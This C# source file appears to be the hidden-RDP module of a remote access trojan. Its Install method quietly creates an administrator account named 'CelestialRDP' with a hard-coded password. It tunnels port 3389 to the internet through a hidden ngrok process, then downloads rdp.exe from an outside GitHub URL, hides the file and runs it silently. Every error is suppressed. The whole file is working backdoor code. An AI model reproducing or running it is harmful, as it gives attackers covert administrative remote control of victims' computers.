using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Globalization;
using System.IO;
using System.Net;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace celestialC.Helper.HRDP
{
    internal class RDP
    {
        public static bool AccountExists(string name)
        {
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                UserPrincipal user = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, name);
                return (user != null);
            }
        }

        public static void Install()
        {
            try
            {
                DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry directoryEntry2 = directoryEntry.Children.Add("CelestialRDP", "user");
                directoryEntry2.Invoke("SetPassword", new object[]
                {
                    "qwerty10"
                });
                directoryEntry2.CommitChanges();
                CultureInfo systemLanguage = CultureInfo.InstalledUICulture;
                DirectoryEntry directoryEntry3;
                if (systemLanguage.TwoLetterISOLanguageName == "ru") directoryEntry3 = directoryEntry.Children.Find("Администраторы", "group");
                else directoryEntry3 = directoryEntry.Children.Find("Administrators", "group");
                directoryEntry3?.Invoke("Add", new object[]
                {
                    directoryEntry2.Path.ToString()
                });
            }
            catch { }
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe";
                startInfo.Arguments = "tcp 3389";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.CreateNoWindow = true;
                Process.Start(startInfo);
            }
            catch { }
            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://raw.githubusercontent.com/lanzerpub/libs2/main/rdp.exe", Environment.ExpandEnvironmentVariables("%Temp%") + "\\rdp.exe");
                }
                File.SetAttributes(Environment.ExpandEnvironmentVariables("%Temp%") + "\\rdp.exe", FileAttributes.Hidden | FileAttributes.System);
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = Environment.ExpandEnvironmentVariables("%Temp%") + "\\rdp.exe";
                startInfo.Arguments = "-i -s";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.CreateNoWindow = true;
                Process.Start(startInfo);
            }
            catch { }
        }
    }
}
